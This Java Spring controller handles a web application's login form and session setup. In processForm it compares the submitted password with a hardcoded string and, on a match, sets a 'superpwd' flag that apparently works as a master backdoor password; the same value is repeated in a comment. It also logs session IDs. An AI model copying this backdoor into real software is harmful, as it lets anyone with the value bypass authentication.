package com.eis.wap.controllers;

import java.text.DateFormat;
import java.text.SimpleDateFormat;
import java.util.Date;
import java.util.HashMap;
import java.util.Map;

import javax.servlet.http.HttpServletRequest;
import javax.servlet.http.HttpServletResponse;
import javax.servlet.http.HttpSession;

import org.apache.log4j.Logger;
import org.springframework.beans.factory.annotation.Autowired;
import org.springframework.stereotype.Controller;
import org.springframework.web.bind.annotation.ModelAttribute;
import org.springframework.web.bind.annotation.RequestMapping;
import org.springframework.web.bind.annotation.RequestMethod;
import org.springframework.web.servlet.ModelAndView;

import com.eis.wap.dao.UserDAO;
import com.eis.wap.model.LoginForm;
import com.eis.wap.model.SessionUser;
import com.eis.wap.service.LoginService;

@Controller
@RequestMapping("loginform.html")
public class LoginController {

	//private HttpSession session;

	@Autowired
	LoginService loginService;

	private static final Logger logger = Logger.getLogger(LoginController.class);	
	
	@SuppressWarnings("unchecked")
	@RequestMapping(method = RequestMethod.GET)
	public ModelAndView showForm(@ModelAttribute("loginform") LoginForm loginForm) {
		ModelAndView model = new ModelAndView("loginform");
		HashMap<Integer,String> divMap=loginService.getDivIdDesc();
		model.addObject("divMap", divMap);
		return model;
	}
	/*
	private void createSession(HttpServletRequest req, User user) {
		session = req.getSession(true);

		if (session.getAttribute("loginDetails")==null) {
			session.setAttribute("loginDetails", user);	
		}
	}*/

	@RequestMapping(method = RequestMethod.POST)
	public ModelAndView processForm(@ModelAttribute("loginform") LoginForm loginForm, HttpSession session,HttpServletRequest request, HttpServletResponse response) {
		ModelAndView model = null;
		String userName = loginForm.getUserName();
		String password = loginForm.getPassword();
		String date = loginForm.getLoginDate();
		//String date = "01-04-2018";
		Integer divId = Integer.parseInt(loginForm.getDivision());
		// validate user credentials and return user details to store in session
		logger.error("Custom Info : LOGIN -- userName : "+userName +" Div : "+ divId);
		boolean superpwd=false;
		if(password.equals("506dadd3692e6e3b2214e9e081952567")){
			superpwd=true;
		}
		SessionUser user = loginService.login(userName, password, date, divId, superpwd);
		if(null != user) {
			if(null != user.getError() && !user.getError().equalsIgnoreCase("")){
				model = new ModelAndView("loginform");
				HashMap<Integer,String> divMap=loginService.getDivIdDesc();
				model.addObject("divMap", divMap);
				model.addObject("error", user.getError());
			}else{
				model = new ModelAndView("mainmenu");
				model.addObject("login","true");
				String design=user.getLvlDescMap().get("Level"+user.getLevel()+"Desc");
				if(design!=null){
					model.addObject("desig",design);
					user.setDesig(design);
				}else{
					model.addObject("desig",user.getLvlDescMap().get("level"+user.getLevel()+"desc")); //as it is both: Level1Desc and level7desc and hashmap is case sensitive.
					user.setDesig(user.getLvlDescMap().get("level"+user.getLevel()+"desc"));				
				}	
				
				DateFormat dateFormat = new SimpleDateFormat("yyyy/MM/dd HH:mm:ss");
			    //get current date time with Date()
			    Date currdate = new Date();
			    user.setCurrDate(dateFormat.format(currdate));
				
				user.setLockStatus(loginService.getLockStatus(user.getLoginYr()+user.getLoginMth(),user.getDivId()));
				user.setUrl(request.getRequestURL().replace(request.getRequestURL().lastIndexOf("/"),request.getRequestURL().length(),""));
				//System.out.println("actual date : "+user.getCurrDate());
				session.setAttribute("user", user);
				//506dadd3692e6e3b2214e9e081952567
				logger.error("Custom Info : LOGIN -- Session Id : "+session.getId()+" Logged In User : "+user.getEmp()+" DateTime : "+user.getCurrDate());
			}
			
		}else {
			model = new ModelAndView("loginform");
			HashMap<Integer,String> divMap=loginService.getDivIdDesc();
			model.addObject("divMap", divMap);
			model.addObject("error", "Invalid login details");
		}
		//String contextPath = request.getContextPath();
		//System.out.println("url :  "+request.getRequestURL().replace(request.getRequestURL().lastIndexOf("/"),request.getRequestURL().length(), ""));
        //System.out.println("contextPath : "+contextPath+" getRequestURL() : "+request.getRequestURL()+" Host = " + request.getServerName()+" Port = " + request.getServerPort());
		return model;
	}

	/*	private void invalidateSession(){
		session.setAttribute("loginDetails", null);
		session.invalidate();
	}
	 */
	/*	private User getSession(HttpServletRequest req){
		session = req.getSession(true);
		return (User) session.getAttribute("loginDetails");
	}
	 */
}
